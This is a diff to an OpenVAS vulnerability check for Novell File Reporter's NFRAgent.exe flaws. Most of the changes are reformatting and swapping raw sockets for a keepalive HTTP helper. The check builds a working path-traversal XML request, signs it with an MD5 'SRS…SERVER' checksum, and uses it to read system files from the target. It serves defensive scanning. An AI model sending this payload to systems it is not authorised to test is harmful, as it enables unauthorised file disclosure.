@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_novell_file_reporter_56579.nasl 7577 2017-10-26 10:41:56Z cfischer $
+# $Id: gb_novell_file_reporter_56579.nasl 10322 2018-06-26 06:37:28Z cfischer $
 #
 # Novell File Reporter 'NFRAgent.exe' Multiple Security Vulnerabilities
 #
@@ -25,44 +25,46 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103623");
- script_bugtraq_id(56579);
- script_cve_id("CVE-2012-4956","CVE-2012-4957","CVE-2012-4958","CVE-2012-4959");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_version ("$Revision: 7577 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.103623");
+  script_bugtraq_id(56579);
+  script_cve_id("CVE-2012-4956", "CVE-2012-4957", "CVE-2012-4958", "CVE-2012-4959");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_version("$Revision: 10322 $");
+  script_name("Novell File Reporter 'NFRAgent.exe' Multiple Security Vulnerabilities");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 08:37:28 +0200 (Tue, 26 Jun 2018) $");
+  script_tag(name:"creation_date", value:"2012-12-12 17:33:48 +0100 (Wed, 12 Dec 2012)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80, 3037);
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
- script_name("Novell File Reporter 'NFRAgent.exe' Multiple Security Vulnerabilities");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56579");
+  script_xref(name:"URL", value:"http://www.novell.com/products/file-reporter/");
 
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56579");
- script_xref(name : "URL" , value : "http://www.novell.com/products/file-reporter/");
+  script_tag(name:"summary", value:"Novell File Reporter is prone to the following security
+  vulnerabilities:
 
- script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
- script_tag(name:"creation_date", value:"2012-12-12 17:33:48 +0100 (Wed, 12 Dec 2012)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
- script_require_ports("Services/www", 80, 3037);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : "Novell File Reporter is prone to the following security
- vulnerabilities:
+  1. A heap-based buffer-overflow vulnerability
 
- 1. A heap-based buffer-overflow vulnerability
+  2. Multiple arbitrary file-download vulnerabilities
 
- 2. Multiple arbitrary file-download vulnerabilities
+  3. An arbitrary file-upload vulnerability");
 
- 3. An arbitrary file-upload vulnerability");
- script_tag(name : "impact" , value : "Remote attackers can exploit these issues to upload and download
- arbitrary files and execute arbitrary code in the context of the application.");
- script_tag(name : "affected" , value : "Novell File Reporter 1.0.2 is vulnerable; other versions may also
- be affected.");
+  script_tag(name:"impact", value:"Remote attackers can exploit these issues to upload and download
+  arbitrary files and execute arbitrary code in the context of the application.");
 
- script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"affected", value:"Novell File Reporter 1.0.2 is vulnerable. Other versions may also
+  be affected.");
 
- exit(0);
+  script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"solution_type", value:"NoneAvailable");
+
+  exit(0);
 }
 
 include("misc_func.inc");
@@ -71,9 +73,6 @@ include("host_details.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:3037);
-soc = open_sock_tcp(port);
-if(!soc)exit(0);
-
 host = http_host_name(port:port);
 
 files = traversal_files();
@@ -86,7 +85,7 @@ foreach file (keys(files)) {
     path = '../../../../../../../../../../../../../../' + files[file];
   } else {
     path = '..\\..\\..\\..\\..\\..\\..\\..\\..\\' + files[file];
-  }  
+  }
 
   ex = '<RECORD><NAME>FSFUI</NAME><UICMD>126</UICMD><FILE>' + path  + '</FILE></RECORD>';
   ex_md5 = toupper(hexstr(MD5('SRS' + ex + 'SERVER')));
@@ -99,24 +98,15 @@ foreach file (keys(files)) {
                "Host: ", host, "\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Content-Type: text/xml\r\n",
-               "Content-Length: ",len,"\r\n",
+               "Content-Length: ", len, "\r\n",
                "\r\n",
                ex);
+  res = http_keepalive_send_recv(port:port, data:req);
 
-  send(socket:soc, data:req);
-  x = 0;
-  while (recv = recv(socket:soc, length:1024)) {
-
-    x++;
-    result += recv; 
-    if(x>10)break;
-  
-  }
-
-  if(eregmatch(pattern:file, string:result)) {
+  if(eregmatch(pattern:file, string:res)) {
     security_message(port:port);
     exit(0);
-  }  
+  }
 }
 
 exit(99);
